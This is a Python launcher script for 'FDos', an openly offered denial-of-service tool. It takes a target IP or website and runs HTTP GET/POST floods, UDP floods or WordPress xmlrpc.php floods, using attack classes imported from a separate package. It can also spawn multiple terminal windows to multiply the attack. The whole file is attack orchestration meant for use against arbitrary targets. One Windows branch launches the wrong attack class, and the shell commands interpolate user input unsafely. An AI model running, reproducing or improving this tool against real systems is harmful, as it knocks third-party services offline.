#############################################################
# FDos - All Ddos in one tools!.
# Credit : https://github.com/fooster1337
# If free, just use it okey?
#############################################################
import argparse
import os
import subprocess
from ddos.httpsgp import Http
from ddos.udp import Udp
from ddos.xmlrpc import Xmlrpc
import sys
import ipaddress
from urllib.parse import urlparse

version = 2.0
banner = """
  ______ _____        _____ 
 |  ____|  __ \      / ____|
 | |__  | |  | | ___| (___  
 |  __| | |  | |/ _ \\___ \ 
 | |    | |__| | (_) |___) |
 |_|    |_____/ \___/_____/                 
"""

def error_msg(msg):
    print(f"[ERROR] {msg}")

def uparse(url):
    return urlparse(url).netloc

# check xterm for summon method.
def check_xterm():
    try:
        subprocess.run(['which', 'xterm'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def main():
    parser = argparse.ArgumentParser(description="FDos - All Ddos in one tools.")
    parser.add_argument('-t', '--target', help='Set target (IP/Domain)', metavar='target')
    parser.add_argument('-d', '--ddos', help='DDOS Type (use -ld/--list_ddos)', metavar='ddos_type')
    parser.add_argument('-s', '--sleep', help='Delay when down/something error.', type=float, default=0.1, metavar='time')
    parser.add_argument('-sm', '--summon', help="Summon another terminal proccess for ddos", metavar='number', type=int, default=0)
    parser.add_argument('-th', '--thread', help='Thread for attack. Default = 10', type=int, default=10, metavar='number_thread')
    parser.add_argument('-v', '--version', help='Show Version Tools', required=False, action='store_true')
    parser.add_argument('-ld', '--list_ddos', help='Show DDOS Type', action='store_true')
    
    #print(args)
    if len(sys.argv) <= 1:
        print(banner)
        parser.parse_args(['-h'])
        sys.exit(0)
    else:
        args = parser.parse_args()
        if args.version:
            print(version)
        if args.target:
            try:
                if args.target.startswith((('http://', 'https://', 'www.'))):
                    tipe = "website"
                else:
                    ipaddress.ip_address(args.target)
                    tipe = "ip"
            except:
                error_msg("Target not valid. please use ip address or if you target is website use http/https")
                sys.exit(0)

        if args.list_ddos:
            list_ddos = """DDoS Attack Available : \nHTTP/SG (HTTP/S GET METHOD)
HTTP/SP (HTTP/S POST METHOD)
UDP (UDP FLOOD)
XMLRPC (XMLRPC.PHP DDOS ON WORDPRESS SITE)
For using : -d (ddos_type) example : -d HTTP/SG or -d XMLRPC"""
            print(list_ddos)
            sys.exit(0)
        if args.ddos:
            ddos_type = ['HTTP/SG', 'HTTP/SP', 'UDP', 'XMLRPC']
            if args.ddos.upper() not in ddos_type:
                error_msg("DDOS Type not found. Please check -ld/--list_ddos")

        if args.target is None:
            error_msg('Target cannot be empty. use -t/--target you_target'); sys.exit(0)
        if args.ddos is None:
            error_msg('DDoS type cannot be empty. use -d/--ddos ddos_type\nFor list type ddos use -ld/--list_ddos'); sys.exit(0)
        

        # execute
        #conf = {"ddos": args.ddos.lower(), "target": args.target, ""}
        if args.ddos.upper() == "HTTP/SP" or args.ddos.upper() == "HTTP/SG":
            if args.summon != 0:
                if os.name == 'nt':
                    command = f"python -c \"from ddos.httpsgp import Http; send = Http('{args.ddos.lower()}', '{args.target}', {str(args.sleep)}, {str(args.thread)}, '{tipe}'); send.attack()\""
                    for i in range(args.summon):
                        os.system(f"start cmd /K {command}")

                else:
                    if check_xterm():
                        xterm = f"python3 -c 'from ddos.httpsgp import Http; send = Http(\"{args.ddos.lower()}\", \"{args.target}\", {str(args.sleep)}, {str(args.thread)}, \"{tipe}\"); send.attack()'&"
                        for i in range(args.summon):
                            os.system(f"xterm -hold -e {xterm}")
                    else:
                        error_msg("Xterm is not installed. Automatic disable this feature.")
            send = Http(args.ddos, args.target, args.sleep, args.thread, tipe)
            send.attack()
            
        if args.ddos.upper() == "UDP":
            if args.summon != 0:
                if os.name == 'nt':
                    command = f"python -c \"from ddos.udp import Udp; send = Udp('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
                    for i in range(args.summon):
                        os.system(f"start cmd /K {command}")
                else:
                    if check_xterm():
                        xterm = f"python3 -c 'from ddos.udp import Udp; send = Udp(\"{args.target}\", {str(args.thread)}, {str(args.sleep)}); send.attack()'&"
                        for i in range(args.summon):
                            os.system(f"xterm -hold -e {xterm}")
                    else:
                        error_msg("Xterm is not installed. Automatic disable this feature.")
            send = Udp(args.target, args.thread, args.sleep)
            send.attack()

        if args.ddos.upper() == "XMLRPC":
            if '/xmlrpc.php' not in args.target:
                error_msg("Please include path xmlrpc.php"); sys.exit(0)
            if args.summon != 0:
                if os.name == 'nt':
                    command = f"python -c \"from ddos.udp import Udp; send = Udp('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
                    for i in range(args.summon):
                        os.system(f"start cmd /K {command}")
                else:
                    if check_xterm():
                        xterm = f"python3 -c 'from ddos.xmlrpc import Xmlrpc; send = Xmlrpc(\"{args.target}\", {str(args.thread)}, {str(args.sleep)}); send.attack()'&"
                        for i in range(args.summon):
                            os.system(f"xterm -hold -e {xterm}")
                    else:
                        error_msg("Xterm is not installed. Automatic disable this feature.")
            send = Xmlrpc(args.target, args.thread, args.sleep)
            send.attack()
        
if __name__ == '__main__':
    main()
